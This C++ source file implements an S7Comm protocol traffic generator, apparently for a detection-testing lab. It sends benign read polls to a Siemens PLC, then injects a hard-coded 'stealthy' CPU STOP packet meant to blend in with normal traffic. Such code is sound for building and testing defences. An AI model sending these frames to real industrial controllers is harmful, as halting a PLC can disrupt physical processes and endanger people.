#include "sentinel_lab/stateful_fuzzer.hpp"
#include <iostream>
#include <fstream>
#include <sstream>

namespace sentinel::lab
{

    StatefulFuzzer::StatefulFuzzer(StatefulFuzzerConfig config)
        : config_(std::move(config)) {}

    void StatefulFuzzer::reset_session() noexcept
    {
        current_state_ = ScadaSessionState::UNCONNECTED;
        seq_num_ = 0;
        polling_count_ = 0;
    }

    StatefulSessionFrame StatefulFuzzer::generate_next_session_frame()
    {
        StatefulSessionFrame frame{};
        frame.sequence_number = ++seq_num_;
        frame.delay_ms = config_.inter_packet_delay_ms;

        switch (current_state_)
        {
        case ScadaSessionState::UNCONNECTED:
        {
            // Step 1: Send COTP Connection Request (CR)
            uint8_t cotp_cr[] = {0x03, 0x00, 0x00, 0x16, 0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00};
            frame.payload.assign(cotp_cr, cotp_cr + sizeof(cotp_cr));
            frame.current_state = ScadaSessionState::UNCONNECTED;
            current_state_ = ScadaSessionState::COTP_ESTABLISHED;
            break;
        }
        case ScadaSessionState::COTP_ESTABLISHED:
        {
            // Step 2: Send S7Comm Setup Communication PDU
            uint8_t s7_setup[] = {0x03, 0x00, 0x00, 0x19, 0x02, 0xF0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xE0};
            frame.payload.assign(s7_setup, s7_setup + sizeof(s7_setup));
            frame.current_state = ScadaSessionState::COTP_ESTABLISHED;
            current_state_ = ScadaSessionState::S7_SESSION_READY;
            break;
        }
        case ScadaSessionState::S7_SESSION_READY:
        case ScadaSessionState::BENIGN_POLLING:
        {
            // Step 3: Send benign Read Data query
            uint8_t s7_read[] = {0x03, 0x00, 0x00, 0x1F, 0x02, 0xF0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0E, 0x00, 0x00, 0x04, 0x01, 0x12, 0x0A, 0x10, 0x02, 0x00, 0x01, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00};
            frame.payload.assign(s7_read, s7_read + sizeof(s7_read));
            frame.current_state = ScadaSessionState::BENIGN_POLLING;

            polling_count_++;
            if (polling_count_ >= config_.benign_polling_cycles)
            {
                current_state_ = ScadaSessionState::STEALTH_INJECTION;
            }
            else
            {
                current_state_ = ScadaSessionState::BENIGN_POLLING;
            }
            break;
        }
        case ScadaSessionState::STEALTH_INJECTION:
        {
            // Step 4: Inject stealthy Memory Write / CPU STOP command (0x29)
            uint8_t s7_stop[] = {0x03, 0x00, 0x00, 0x21, 0x02, 0xF0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x10, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x50, 0x5F, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D};
            frame.payload.assign(s7_stop, s7_stop + sizeof(s7_stop));
            frame.current_state = ScadaSessionState::STEALTH_INJECTION;

            // Reset back to unconnected to start next session loop
            reset_session();
            break;
        }
        }

        return frame;
    }

} // namespace sentinel::lab